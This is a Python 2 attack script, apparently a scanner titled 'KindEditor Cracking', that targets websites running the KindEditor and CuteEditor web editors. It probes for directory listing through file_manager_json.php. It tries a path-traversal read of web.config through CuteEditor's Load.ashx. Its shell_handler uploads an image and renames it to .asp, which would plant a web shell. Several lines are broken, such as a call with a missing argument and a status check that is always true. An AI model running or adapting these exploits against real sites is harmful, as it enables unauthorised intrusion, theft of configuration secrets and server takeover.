#!/usr/bin/env python
#coding = utf-8
sys.path.append("plugin/")
import re
import urllib
import urllib2
import os
import sys
import httplib
#import color_pr
import time
from poster.streaminghttp import register_openers
from poster.encode import multipart_encode
global url,resp


def response(rurl,path_name):
    resp=urllib.urlopen(rurl+path_name)
    return resp

def xpath():
    xpath_sample="demon_test/"
    xpath_dic="/php/file_manager_json.php?path=/"
    xpath_url=url+xpath_dic
    if len(response(xpath_url).read()) != len(response(xpath_url+xpath_sample).read()):
        print "[!]Maybe with a KindEditor xpath xday==>\n"+xpath_url



def shell_handler():
    if response(url,"uploadfiles.php?currentFolder=/upfiles/down/").getcode() == 200:
        upload_url = url+"uploadfiles.php?currentFolder=/upfiles/down/"
        #Get oldfile name first!!
        resp=upload(url+'php/upload_json.php',{'imgFile':open('test.jpg', "rb")})
        oldfile=re.findall(r'\/\d+.*\.jpg',resp)[-1][1:]
        params={"oldFile":open(oldfile, "rb"),"fileHZ":"asp","action":"modifyFileName_save"}
        try:
            upload(upload_url,params)
        except:
            pass


def upload(upload_url,params):
    tmp_params={}
    ##opener = poster.streaminghttp.register_openers()
    #opener.add_handler(urllib2.HTTPCookieProcessor(cookielib.CookieJar()))
    #params = {'file': open("sysinfo.asp", "rb"), 'name': 'NewFile'}
    #datagen, headers = poster.encode.multipart_encode(params)
    #request = urllib2.Request(upload_url, datagen, headers)
    #result = urllib2.urlopen(request)
    register_openers()
    datagen, headers = multipart_encode(params)
    request = urllib2.Request(upload_url, datagen, headers)
    upload_resp = urllib2.urlopen(request).read()
    return upload_resp



def file_read():
    load_url=url+"CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
    if response(load_url)==200:
        print "[!]Maybe with a CuteEditor file_read xday==>\n"+load_url



if __name__ == "__main__":
    #print sys.argv[1]
    site = sys.argv[1]
    url="http://"+site
    print "||===>url:"+url+"====KindEditor Cracking====>\n"
    resp = response(url,"")
    if resp.status == 403 or 200:
       file_read()

